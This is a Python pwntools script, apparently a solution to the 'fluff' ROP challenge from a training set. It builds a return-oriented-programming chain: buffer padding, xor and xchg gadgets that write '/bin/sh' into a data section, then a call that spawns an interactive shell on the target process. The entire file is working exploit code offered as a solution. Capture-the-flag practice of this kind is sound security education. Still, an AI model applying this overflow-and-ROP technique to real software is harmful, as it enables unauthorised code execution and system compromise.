#!/usr/bin/env python2
from pwn import *

# Plan
# 
# Move String to Memory
# Pass as argument to usefulFunction
# 

# Rops & Addresses
usefulFunction  = 0x00400810 # - 9 for start
data_write      = 0x00601050 + 0x10

# pop r15;
# xor r11, r11;
# pop r14;
# mov edi, unecessary_thing; 
# ret;
reset_r11                   = 0x00400820

# pop r14;
# xor r11, r12;
# pop r12;
# mov r13d, unecessary_stuff;
# ret;
xor_r11_r12                 = 0x0040082d

# mov edi, unecessary_stuff;
# xchg r11, r10;
# pop r15;
# mov r11d, unecessary_stuff;
# ret;
xchg_r11_r10                = 0x0040083b

# pop r15;
# mov qword [r10], r11;
# pop r13;
# pop r12;
# xor byte [r10], r12b;
# ret;
mov_r11_r10_xor_r10_12b     = 0x0040084c

# pop r12; mov r13d, 0x604060; ret;
pop_r12                     = 0x00400832

# pop rdi; ret;
pop_rdi                     = 0x004008c3

rubbish = 0x69696969

command  = "/bin/sh"
command  = command.ljust(16, '\x00')


# Functions

def load_string(string, base_addr):
    payload = ""
    for i in range(0, len(string), 8):
        
        # Set r10 to base_addr + i

        payload += p64(reset_r11)       # r11 = 0
        payload += p64(rubbish)
        payload += p64(rubbish)
        
        payload += p64(pop_r12)         # r12 = base_addr + i
        payload += p64(base_addr + i)

        payload += p64(xor_r11_r12)     # r11 = base_addr + i
        payload += p64(rubbish)
        payload += p64(rubbish)

        payload += p64(xchg_r11_r10)    # r10 = base_addr + i
        payload += p64(rubbish)

        # set qword [r11] to /bin/sh
        
        payload += p64(reset_r11)       # r11 = 0
        payload += p64(rubbish)
        payload += p64(rubbish)

        payload += p64(pop_r12)         # r12 = string[i:i+8]
        payload += string[i:i+8]
        
        payload += p64(xor_r11_r12)     # r11 = 0 ^ string[i:i+8] 
        payload += p64(rubbish)         # r11 = string[i:i+8]
        payload += p64(rubbish)

        # write string to memory
        
        payload += p64(mov_r11_r10_xor_r10_12b)
        payload += p64(rubbish)
        payload += p64(rubbish)
        payload += p64(0x00)

    return payload

# Payload
payload  = ""
payload += "A"*40
payload += load_string(command, data_write)

# Set system arguments
payload += p64(pop_rdi)
payload += p64(data_write)

payload += p64(usefulFunction)

log.info("Payload:\n" + payload.encode('hex'))
with open('payload', 'wb') as f:
    f.write(payload)

exe  = "./fluff"
proc = process(exe) 
proc.recv()
proc.sendline(payload)
proc.interactive()
